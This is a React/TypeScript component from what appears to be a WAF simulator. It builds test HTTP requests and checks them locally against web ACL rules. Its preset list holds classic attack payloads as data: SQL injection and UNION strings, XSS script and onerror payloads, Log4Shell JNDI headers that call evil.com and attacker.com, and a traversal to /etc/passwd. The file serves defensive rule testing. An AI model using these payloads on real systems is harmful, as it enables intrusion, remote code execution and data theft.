"use client";

import React, { useState } from "react";
import { useWAFSimStore } from "@/store/wafsimStore";
import { HttpRequest, HTTPMethod, HTTPProtocol, AttackPreset } from "@/lib/types";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Textarea } from "@/components/ui/textarea";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { Badge } from "@/components/ui/badge";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import {
  Play,
  Send,
  Plus,
  Trash2,
  Zap,
  Loader2,
  Globe,
  FileJson,
  Settings,
} from "lucide-react";
import { evaluateWebACL } from "@/engines/wafEngine";
import { QuickLoadPresets } from "./QuickLoadPresets";

// Attack presets
const ATTACK_PRESETS: AttackPreset[] = [
  {
    id: "sqli-basic",
    name: "SQL Injection",
    description: "Basic SQL injection attempt",
    category: "sqli",
    request: {
      method: "GET",
      uri: "/api/users?id=1' OR '1'='1",
      sourceIP: "192.168.1.100",
      country: "US",
    },
    expectedBehavior: "Should be blocked by SQLi detection rules",
  },
  {
    id: "sqli-union",
    name: "UNION SQLi",
    description: "UNION-based SQL injection",
    category: "sqli",
    request: {
      method: "GET",
      uri: "/search?q=' UNION SELECT * FROM users--",
      sourceIP: "192.168.1.100",
      country: "US",
    },
  },
  {
    id: "xss-script",
    name: "XSS Script Tag",
    description: "Basic XSS with script tag",
    category: "xss",
    request: {
      method: "POST",
      uri: "/comment",
      body: '<script>alert("XSS")</script>',
      headers: [{ name: "Content-Type", value: "application/x-www-form-urlencoded" }],
      sourceIP: "192.168.1.100",
      country: "US",
    },
  },
  {
    id: "xss-event",
    name: "XSS Event Handler",
    description: "XSS via event handler attribute",
    category: "xss",
    request: {
      method: "POST",
      uri: "/profile",
      body: '<img src=x onerror=alert(1)>',
      sourceIP: "192.168.1.100",
      country: "US",
    },
  },
  {
    id: "log4shell",
    name: "Log4Shell",
    description: "Log4J RCE vulnerability",
    category: "rce",
    request: {
      method: "GET",
      uri: "/",
      headers: [
        { name: "X-Api-Version", value: "${jndi:ldap://evil.com/x}" },
        { name: "User-Agent", value: "${jndi:ldap://attacker.com/a}" },
      ],
      sourceIP: "192.168.1.100",
      country: "US",
    },
  },
  {
    id: "path-traversal",
    name: "Path Traversal",
    description: "Directory traversal attempt",
    category: "traversal",
    request: {
      method: "GET",
      uri: "/files?path=../../../etc/passwd",
      sourceIP: "192.168.1.100",
      country: "US",
    },
  },
  {
    id: "bot-sqlmap",
    name: "SQLMap Bot",
    description: "Automated SQL injection tool",
    category: "bot",
    request: {
      method: "GET",
      uri: "/products?id=1",
      headers: [{ name: "User-Agent", value: "sqlmap/1.5.2#stable (https://sqlmap.org)" }],
      sourceIP: "10.0.0.50",
      country: "RU",
    },
  },
  {
    id: "admin-access",
    name: "Admin Access",
    description: "Attempt to access admin panel",
    category: "auth",
    request: {
      method: "GET",
      uri: "/wp-admin/setup.php",
      sourceIP: "192.168.1.100",
      country: "CN",
    },
  },
  {
    id: "tor-exit",
    name: "Tor Exit Node",
    description: "Request from Tor network",
    category: "other",
    request: {
      method: "GET",
      uri: "/api/data",
      sourceIP: "185.220.101.1", // Known Tor exit node range
      country: "DE",
    },
  },
  {
    id: "flood-test",
    name: "Rate Flood",
    description: "Simulate high request rate",
    category: "flood",
    request: {
      method: "GET",
      uri: "/api/endpoint",
      sourceIP: "192.168.1.100",
      country: "US",
    },
  },
];

interface TrafficSimulatorProps {
  onSimulate?: (request: HttpRequest) => void;
}

export const TrafficSimulator: React.FC<TrafficSimulatorProps> = ({ onSimulate }) => {
  const {
    currentRequest,
    setCurrentRequest,
    evaluationResult,
    setEvaluationResultWithWAF,
    ipSets,
    regexPatternSets,
    setIsSimulating,
    isSimulating,
    wafs,
  } = useWAFSimStore();

  const [activeTab, setActiveTab] = useState("form");
  const [nlPrompt, setNlPrompt] = useState("");
  const [isGenerating, setIsGenerating] = useState(false);
  const [floodRate, setFloodRate] = useState(100);
  const [floodDuration, setFloodDuration] = useState(1);
  const [batchResults, setBatchResults] = useState<Array<{name: string; category: string; action: string}> | null>(null);

  // Find active WAF
  const activeWAF = wafs.length > 0 ? wafs[0] : null;

  const handleSimulate = () => {
    if (!activeWAF) return;

    setIsSimulating(true);

    const result = evaluateWebACL(currentRequest, activeWAF, {
      ipSets,
      regexPatternSets,
    });

    setEvaluationResultWithWAF(result, activeWAF.id);
    setIsSimulating(false);
    onSimulate?.(currentRequest);
  };

  const handleBatchTest = () => {
    if (!activeWAF) return;
    setIsSimulating(true);

    const results = ATTACK_PRESETS.map((preset) => {
      const req: HttpRequest = {
        protocol: preset.request.protocol || "HTTP/1.1",
        method: preset.request.method || "GET",
        uri: preset.request.uri || "/",
        queryParams: preset.request.queryParams || {},
        headers: preset.request.headers || [{ name: "Host", value: "example.com" }],
        body: preset.request.body || "",
        bodyEncoding: preset.request.bodyEncoding || "none",
        contentType: preset.request.contentType || "application/json",
        sourceIP: preset.request.sourceIP || "192.168.1.100",
        country: preset.request.country || "US",
      };
      const result = evaluateWebACL(req, activeWAF, { ipSets, regexPatternSets });
      return { name: preset.name, category: preset.category, action: result.finalAction };
    });

    setBatchResults(results);
    setIsSimulating(false);
  };

  const handlePresetSelect = (preset: AttackPreset) => {
    const newRequest: HttpRequest = {
      protocol: preset.request.protocol || "HTTP/1.1",
      method: preset.request.method || "GET",
      uri: preset.request.uri || "/",
      queryParams: preset.request.queryParams || {},
      headers: preset.request.headers || [
        { name: "Host", value: "example.com" },
        { name: "User-Agent", value: "Mozilla/5.0" },
      ],
      body: preset.request.body || "",
      bodyEncoding: preset.request.bodyEncoding || "none",
      contentType: preset.request.contentType || "application/json",
      sourceIP: preset.request.sourceIP || "192.168.1.100",
      country: preset.request.country || "US",
    };
    setCurrentRequest(newRequest);
    setActiveTab("form"); // Auto-switch to form to show what changed
  };

  const handleNLGenerate = async () => {
    if (!nlPrompt.trim()) return;

    setIsGenerating(true);

    try {
      const response = await fetch("/api/generate-test-request", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ description: nlPrompt }),
      });

      const data = await response.json();

      if (data.request) {
        setCurrentRequest({
          ...currentRequest,
          ...data.request,
        });
      }
    } catch (error) {
      console.error("Failed to generate request:", error);
    } finally {
      setIsGenerating(false);
    }
  };

  const addHeader = () => {
    setCurrentRequest({
      ...currentRequest,
      headers: [...(currentRequest.headers || []), { name: "", value: "" }],
    });
  };

  const updateHeader = (index: number, field: "name" | "value", value: string) => {
    const newHeaders = [...(currentRequest.headers || [])];
    newHeaders[index] = { ...newHeaders[index], [field]: value };
    setCurrentRequest({ ...currentRequest, headers: newHeaders });
  };

  const removeHeader = (index: number) => {
    const newHeaders = (currentRequest.headers || []).filter((_, i) => i !== index);
    setCurrentRequest({ ...currentRequest, headers: newHeaders });
  };

  return (
    <div className="h-full flex bg-gray-900 text-white overflow-hidden">
      {/* Tabs as vertical sidebar */}
      <div className="w-24 border-r border-gray-700 flex flex-col shrink-0">
        <button onClick={() => setActiveTab("form")} className={`px-2 py-2.5 text-[11px] text-left border-b border-gray-700 ${activeTab === "form" ? "bg-gray-800 text-white" : "text-gray-400 hover:bg-gray-800/50"}`}>
          📝 Form
        </button>
        <button onClick={() => setActiveTab("presets")} className={`px-2 py-2.5 text-[11px] text-left border-b border-gray-700 ${activeTab === "presets" ? "bg-gray-800 text-white" : "text-gray-400 hover:bg-gray-800/50"}`}>
          ⚡ Presets
        </button>
        <button onClick={() => setActiveTab("flood")} className={`px-2 py-2.5 text-[11px] text-left border-b border-gray-700 ${activeTab === "flood" ? "bg-gray-800 text-white" : "text-gray-400 hover:bg-gray-800/50"}`}>
          🌊 Batch
        </button>
      </div>

      {/* Content */}
      <div className="flex-1 overflow-y-auto p-3">
          {/* Protocol & Method */}
          <div className="grid grid-cols-2 gap-4">
            <div>
              <Label className="text-xs text-gray-400">Protocol</Label>
              <Select
                value={currentRequest.protocol}
                onValueChange={(value: HTTPProtocol) =>
                  setCurrentRequest({ ...currentRequest, protocol: value })
                }
              >
                <SelectTrigger className="bg-gray-800 border-gray-700 h-8 text-xs">
                  <SelectValue />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="HTTP/1.0">HTTP/1.0</SelectItem>
                  <SelectItem value="HTTP/1.1">HTTP/1.1</SelectItem>
                  <SelectItem value="HTTP/2">HTTP/2</SelectItem>
                  <SelectItem value="HTTP/3">HTTP/3</SelectItem>
                </SelectContent>
              </Select>
            </div>
            <div>
              <Label className="text-xs text-gray-400">Method</Label>
              <Select
                value={currentRequest.method}
                onValueChange={(value: HTTPMethod) =>
                  setCurrentRequest({ ...currentRequest, method: value })
                }
              >
                <SelectTrigger className="bg-gray-800 border-gray-700 h-8 text-xs">
                  <SelectValue />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="GET">GET</SelectItem>
                  <SelectItem value="POST">POST</SelectItem>
                  <SelectItem value="PUT">PUT</SelectItem>
                  <SelectItem value="DELETE">DELETE</SelectItem>
                  <SelectItem value="PATCH">PATCH</SelectItem>
                  <SelectItem value="HEAD">HEAD</SelectItem>
                  <SelectItem value="OPTIONS">OPTIONS</SelectItem>
                </SelectContent>
              </Select>
            </div>
          </div>

          {/* URI */}
          <div>
            <Label className="text-xs text-gray-400">URI</Label>
            <Input
              value={currentRequest.uri}
              onChange={(e) => setCurrentRequest({ ...currentRequest, uri: e.target.value })}
              placeholder="/api/endpoint"
              className="bg-gray-800 border-gray-700 h-8 text-xs"
            />
          </div>

          {/* Headers */}
          <div>
            <div className="flex items-center justify-between mb-2">
              <Label className="text-xs text-gray-400">Headers</Label>
              <Button size="sm" variant="outline" onClick={addHeader} className="h-7 text-xs">
                <Plus className="w-3 h-3 mr-1" />
                Add
              </Button>
            </div>
            <div className="space-y-2">
              {(currentRequest.headers || []).map((header, index) => (
                <div key={index} className="flex gap-2">
                  <Input
                    value={header.name}
                    onChange={(e) => updateHeader(index, "name", e.target.value)}
                    placeholder="Header name"
                    className="bg-gray-800 border-gray-700 flex-1"
                  />
                  <Input
                    value={header.value}
                    onChange={(e) => updateHeader(index, "value", e.target.value)}
                    placeholder="Header value"
                    className="bg-gray-800 border-gray-700 flex-1"
                  />
                  <Button
                    size="sm"
                    variant="ghost"
                    onClick={() => removeHeader(index)}
                    className="text-red-400 hover:text-red-300"
                  >
                    <Trash2 className="w-4 h-4" />
                  </Button>
                </div>
              ))}
            </div>
          </div>

          {/* Body */}
          <div>
            <Label className="text-xs text-gray-400">Request Body</Label>
            <Textarea
              value={currentRequest.body}
              onChange={(e) => setCurrentRequest({ ...currentRequest, body: e.target.value })}
              placeholder='{"key": "value"}'
              className="bg-gray-800 border-gray-700 min-h-[60px] text-xs font-mono text-sm"
            />
          </div>

          {/* Network */}
          <div className="grid grid-cols-2 gap-4">
            <div>
              <Label className="text-xs text-gray-400">Source IP</Label>
              <Input
                value={currentRequest.sourceIP}
                onChange={(e) => setCurrentRequest({ ...currentRequest, sourceIP: e.target.value })}
                placeholder="192.168.1.100"
                className="bg-gray-800 border-gray-700 h-8 text-xs"
              />
            </div>
            <div>
              <Label className="text-xs text-gray-400">Country</Label>
              <Input
                value={currentRequest.country}
                onChange={(e) => setCurrentRequest({ ...currentRequest, country: e.target.value })}
                placeholder="US"
                maxLength={2}
                className="bg-gray-800 border-gray-700 uppercase h-8 text-xs"
              />
            </div>
          </div>
        {activeTab === "presets" && (
          <QuickLoadPresets presets={ATTACK_PRESETS} onSelect={handlePresetSelect} />
        )}
        {activeTab === "flood" && (
          <div className="space-y-3">
            <p className="text-xs text-gray-400">Run all {ATTACK_PRESETS.length} attack presets against your WAF.</p>
            <Button onClick={handleBatchTest} disabled={!activeWAF || isSimulating} className="w-full bg-purple-600 hover:bg-purple-700" size="sm">
              <Play className="w-4 h-4 mr-2" />Run All Presets
            </Button>
            {batchResults && (
              <div className="space-y-1">
                {batchResults.map((r, i) => (
                  <div key={i} className="flex items-center justify-between px-2 py-1 rounded bg-gray-800 text-xs">
                    <div className="flex items-center gap-2">
                      <Badge variant="outline" className="text-[10px] px-1">{r.category}</Badge>
                      <span>{r.name}</span>
                    </div>
                    <Badge className={r.action === "BLOCK" ? "bg-red-600" : r.action === "COUNT" ? "bg-yellow-600" : "bg-green-600"}>
                      {r.action}
                    </Badge>
                  </div>
                ))}
                <div className="flex gap-3 text-xs font-medium pt-1">
                  <span className="text-red-400">Blocked: {batchResults.filter(r => r.action === "BLOCK").length}</span>
                  <span className="text-green-400">Allowed: {batchResults.filter(r => r.action === "ALLOW").length}</span>
                  <span className="text-yellow-400">Counted: {batchResults.filter(r => r.action === "COUNT").length}</span>
                </div>
              </div>
            )}
          </div>
        )}
      </div>
    </div>
  );
};

export default TrafficSimulator;
